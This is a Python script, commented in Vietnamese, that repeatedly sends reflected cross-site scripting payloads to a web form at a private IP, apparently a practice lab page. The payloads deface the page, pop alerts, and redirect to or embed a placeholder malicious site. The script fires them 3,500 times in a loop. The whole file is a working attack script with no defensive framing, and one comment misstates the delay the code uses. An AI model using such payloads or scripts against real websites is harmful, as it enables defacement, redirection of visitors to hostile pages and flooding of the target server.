import requests
import time

# URL gốc
url = "http://192.168.10.10/xss_get.php"

# Danh sách các payload tấn công XSS
payloads = [
    "<h1 style=\"color: red;\">Hacked by XSS</h1>",
    "<img src=\"#\" onmouseover=\"alert('XSS via onmouseover')\">",
    "<script>window.location='http://malicious-site.com'</script>",
    "<iframe src=\"http://malicious-site.com\" width=\"400\" height=\"300\"></iframe>",
    "<img src=\"http://malicious-site.com/image.jpg\" onerror=\"alert('XSS')\">",
    "<script>document.body.innerHTML = \"<h1>Hacked by XSS</h1>\";</script>",
    "<script>document.write(document.location.href)</script>"
]

# Số lượng request cần thực hiện
num_requests = 500

# Hàm thực hiện request với danh sách payloads
def send_xss_requests():
    for i in range(num_requests):
        for payload in payloads:
            params = {
                'firstname': payload,
                'lastname': 'hello',  # Trường lastname cố định là "hello"
                'form': 'submit'
            }

            # Gửi request GET
            response = requests.get(url, params=params)

            # Kiểm tra kết quả trả về
            if response.status_code == 200:
                print(f"Request {i+1}: Thành công")
            else:
                print(f"Request {i+1}: Thất bại")

            # Chờ 0.5 giây trước khi thực hiện request tiếp theo
            time.sleep(0.1)

# Thực hiện request
send_xss_requests()
